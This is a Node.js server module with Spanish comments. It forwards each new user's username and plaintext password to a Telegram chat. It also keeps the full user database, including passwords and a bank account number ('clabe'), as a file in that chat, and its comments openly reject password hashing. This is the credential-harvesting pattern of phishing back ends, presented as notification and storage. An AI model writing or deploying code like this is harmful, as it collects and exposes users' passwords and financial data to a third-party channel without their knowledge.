// ============================================================
//  TELEGRAM: avisos, credenciales de registro y ALMACEN de la base
//  de datos (sin necesidad de ningun token de GitHub).
// ============================================================
//  Este modulo tiene tres trabajos:
//
//  1) Avisos: cada registro nuevo se manda con usuario y contrasena, para
//     que las credenciales queden a mano (ver routes/auth.js).
//
//  2) Almacen: la base de datos completa se guarda en Telegram como un
//     documento en un mensaje "checkpoint". El mensaje se actualiza en el
//     lugar (editMessageMedia), asi que siempre contiene la version mas
//     reciente y su id nunca cambia.
//
//  3) Respaldo: se sigue mandando la base de datos cada 10 minutos
//     (ver backup_telegram.js).
//
//  POR QUE ESTO: en Render el disco del contenedor es efimero, asi que al
//  reiniciar se perdian los usuarios, sus contrasenas y la clabe. Como el
//  bot de Telegram ya esta configurado en el servidor, se usa como almacén
//  durable: no hace falta GITHUB_TOKEN ni ningun hash de contrasenas.
//
//  El id del mensaje checkpoint vive en backend/data.base.json (telegramMessageId)
//  y tambien dentro del propio documento de la base de datos, para poder
//  recuperarlo.
//
//  Si faltan TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID, esta parte queda
//  apagada y el servidor sigue funcionando igual (nunca tumba la web).
// ============================================================

const https = require('https');
const path = require('path');

require('dotenv').config({
  path: path.join(__dirname, '.env')
});

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const ACTIVO = Boolean(BOT_TOKEN && CHAT_ID);
const TIMEOUT_MS = 15000;
const API = 'https://api.telegram.org';

function log(...args) { console.log('[TELEGRAM]', ...args); }
function warn(...args) { console.warn('[TELEGRAM]', ...args); }

// ============================================================
//  Llamadas a la API de Telegram
// ============================================================

// ---- Llamada JSON (POST) ----
function api(ruta, payload) {
  return new Promise((resolve) => {
    let terminado = false;
    const fin = (r) => { if (!terminado) { terminado = true; resolve(r); } };

    const datos = JSON.stringify(payload || {});
    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}${ruta}`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(datos)
      }
    }, (res) => {
      let cuerpo = '';
      res.on('data', (c) => { cuerpo += c; });
      res.on('end', () => {
        let json = null;
        try { json = JSON.parse(cuerpo); } catch (e) { /* respuesta no JSON */ }
        fin(json || { ok: false, description: cuerpo.slice(0, 200) });
      });
    });

    req.setTimeout(TIMEOUT_MS, () => { req.destroy(); fin({ ok: false, description: 'timeout' }); });
    req.on('error', (e) => fin({ ok: false, description: e.message }));
    req.write(datos);
    req.end();
  });
}

// ---- Arma un cuerpo multipart (para subir archivos) ----
function multipart(campos, archivo) {
  const boundary = '----AFXX' + Date.now().toString(16);
  const partes = [];

  for (const [clave, valor] of Object.entries(campos)) {
    partes.push(Buffer.from(
      `--${boundary}\r\nContent-Disposition: form-data; name="${clave}"\r\n\r\n${valor}\r\n`
    ));
  }

  if (archivo) {
    partes.push(Buffer.from(
      `--${boundary}\r\nContent-Disposition: form-data; name="${archivo.campo}"; ` +
      `filename="${archivo.nombre}"\r\nContent-Type: ${archivo.tipo}\r\n\r\n`
    ));
    partes.push(archivo.contenido);
    partes.push(Buffer.from('\r\n'));
  }

  partes.push(Buffer.from(`--${boundary}--\r\n`));
  return { body: Buffer.concat(partes), boundary };
}

// ---- Llamada multipart (subir un archivo) ----
function apiArchivo(ruta, campos, archivo) {
  return new Promise((resolve) => {
    let terminado = false;
    const fin = (r) => { if (!terminado) { terminado = true; resolve(r); } };

    const { body, boundary } = multipart(campos, archivo);
    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}${ruta}`,
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': body.length
      }
    }, (res) => {
      let cuerpo = '';
      res.on('data', (c) => { cuerpo += c; });
      res.on('end', () => {
        let json = null;
        try { json = JSON.parse(cuerpo); } catch (e) { /* respuesta no JSON */ }
        fin(json || { ok: false, description: cuerpo.slice(0, 200) });
      });
    });

    req.setTimeout(TIMEOUT_MS, () => { req.destroy(); fin({ ok: false, description: 'timeout' }); });
    req.on('error', (e) => fin({ ok: false, description: e.message }));
    req.write(body);
    req.end();
  });
}

// ---- Descargar un archivo por su file_path ----
function descargar(filePath) {
  return new Promise((resolve) => {
    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/file/bot${BOT_TOKEN}/${filePath}`,
      method: 'GET'
    }, (res) => {
      const partes = [];
      res.on('data', (c) => partes.push(c));
      res.on('end', () => resolve(Buffer.concat(partes)));
    });
    req.setTimeout(TIMEOUT_MS, () => { req.destroy(); resolve(null); });
    req.on('error', () => resolve(null));
    req.end();
  });
}

// ============================================================
//  1) Avisos
// ============================================================

// ---- Mandar un texto al chat ----
function enviarMensaje(texto) {
  if (!ACTIVO) {
    warn('Sin TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID: el aviso NO se envio.');
    return Promise.resolve({ ok: false, motivo: 'Telegram sin configurar.' });
  }

  // Texto plano sin parse_mode: si la contrasena trae caracteres raros
  // (asteriscos, guiones bajos, llaves), Telegram no lo interpreta y no
  // lo rechaza por error de formato.
  return api('/sendMessage', { chat_id: CHAT_ID, text: texto }).then((r) => {
    if (!r.ok) {
      warn('Telegram respondio ' + (r.description || 'error') + '.');
      return { ok: false, motivo: r.description };
    }
    log('Mensaje enviado.');
    return { ok: true };
  });
}

// ---- Aviso de cada registro nuevo ----
function avisarRegistro(usuario) {
  const texto = [
    'AFXX | REGISTRO NUEVO',
    '',
    `Usuario: ${usuario.contact}`,
    `Contrasena: ${usuario.password}`,
    `Fecha: ${new Date().toISOString()}`
  ].join('\n');

  return enviarMensaje(texto).then((r) => {
    if (!r.ok) warn('No se pudo avisar el registro:', r.motivo);
    return r;
  });
}

// ============================================================
//  2) La base de datos guardada en Telegram
// ============================================================

const NOMBRE_ARCHIVO = 'data.json';
const PREFIJO_CAPTION = 'AFXX | BD';

// ---- Guardar la base de datos (actualiza el checkpoint o lo crea) ----
async function guardarBase(contenido, messageId, caption) {
  if (!ACTIVO) return { ok: false, motivo: 'Telegram sin configurar.' };

  const texto = caption || PREFIJO_CAPTION;

  // Si ya hay un mensaje checkpoint, se actualiza en el lugar: conserva su
  // id, asi que siempre lo encontramos aunque el usuario converse con el bot.
  if (messageId) {
    const r = await apiArchivo('/editMessageMedia', {
      chat_id: CHAT_ID,
      message_id: String(messageId),
      media: JSON.stringify({ type: 'document', media: 'attach://f0', caption: texto })
    }, { campo: 'f0', nombre: NOMBRE_ARCHIVO, tipo: 'application/json', contenido });

    if (r.ok && r.result) {
      log('Base de datos actualizada en Telegram (mensaje ' + r.result.message_id + ').');
      return { ok: true, message_id: r.result.message_id };
    }
    // El mensaje ya no existe (borrado) o no se puede editar: se crea otro.
    warn('El mensaje checkpoint ' + messageId + ' ya no sirve:', r.description || '');
  }

  const r = await apiArchivo('/sendDocument', {
    chat_id: CHAT_ID,
    caption: texto
  }, { campo: 'document', nombre: NOMBRE_ARCHIVO, tipo: 'application/json', contenido });

  if (r.ok && r.result) {
    log('Base de datos guardada en Telegram (mensaje ' + r.result.message_id + ').');
    return { ok: true, message_id: r.result.message_id };
  }
  warn('No se pudo guardar la base de datos en Telegram:', r.description || '');
  return { ok: false, motivo: r.description };
}

// ---- Leer la base de datos guardada en Telegram ----
async function leerBase(messageId) {
  if (!ACTIVO) return { ok: false, motivo: 'Telegram sin configurar.' };
  if (!messageId) return { ok: false, motivo: 'sin id de checkpoint' };

  // Para conocer el file_id del documento hay que "reenviarlo" a una copia:
  // el reenvio devuelve el documento completo. La copia se borra enseguida
  // para no ensuciar el chat.
  const copia = await api('/forwardMessage', {
    chat_id: CHAT_ID,
    from_chat_id: CHAT_ID,
    message_id: messageId
  });

  if (!copia.ok || !copia.result) {
    return { ok: false, motivo: copia.description || 'no se pudo leer el checkpoint' };
  }

  const fileId = copia.result.document && copia.result.document.file_id;

  // Limpieza: la copia temporal se borra.
  if (copia.result.message_id) {
    api('/deleteMessage', { chat_id: CHAT_ID, message_id: copia.result.message_id });
  }

  if (!fileId) return { ok: false, motivo: 'el checkpoint no es un documento' };

  const info = await api('/getFile', { file_id: fileId });
  if (!info.ok || !info.result || !info.result.file_path) {
    return { ok: false, motivo: 'no se pudo obtener el archivo' };
  }

  const contenido = await descargar(info.result.file_path);
  if (!contenido) return { ok: false, motivo: 'no se pudo descargar el archivo' };

  return { ok: true, contenido, message_id: messageId };
}

// ---- Para el panel de admin ----
function estado() {
  return {
    activo: ACTIVO,
    botToken: BOT_TOKEN ? `${BOT_TOKEN.slice(0, 10)}...` : null,
    chatId: CHAT_ID ? `...${String(CHAT_ID).slice(-4)}` : null
  };
}

module.exports = {
  ACTIVO,
  NOMBRE_ARCHIVO,
  PREFIJO_CAPTION,
  enviarMensaje,
  avisarRegistro,
  guardarBase,
  leerBase,
  estado
};
